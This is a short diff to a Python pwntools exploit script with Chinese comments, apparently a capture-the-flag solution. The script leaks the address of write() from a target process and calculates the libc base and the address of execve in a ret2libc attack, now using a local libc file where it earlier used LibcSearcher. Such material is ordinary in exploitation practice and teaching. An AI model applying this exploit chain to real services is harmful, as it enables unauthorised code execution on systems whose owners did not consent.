@@ -63,13 +63,14 @@ if __name__ == '__main__':
     write_addr = u64(sh.recv(8))
 
     # 确定了 libc 版本为 libc6-amd64_2.13-0ubuntu13.2_i386
-    print(write_addr)
+    log.success(f'write addr {write_addr}')
 
     # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
-    print(sh.recv())
+    log.info(sh.recv())
 
     # step2: 获取 execve 在程序中的真实地址
-    libc = LibcSearcher('write' ,write_addr)
-    libc_base = write_addr - libc.dump('write')
-    execve_addr = libc_base + libc.dump('execve')
-    log.success('execve_addr ' + hex(execve_addr))
+    libc = ELF('libc6-amd64_2.13-0ubuntu13.2_i386.so')
+    execve_offset = libc.symbols['execve']  # execve在libc中的偏移量
+    libc_base = write_addr - libc.symbols['write']  # 计算出libc的基址
+    execve_addr = libc_base + execve_offset  # 通过偏移量计算execve的实际地址
+    log.success(f'execve addr: {execve_addr}')
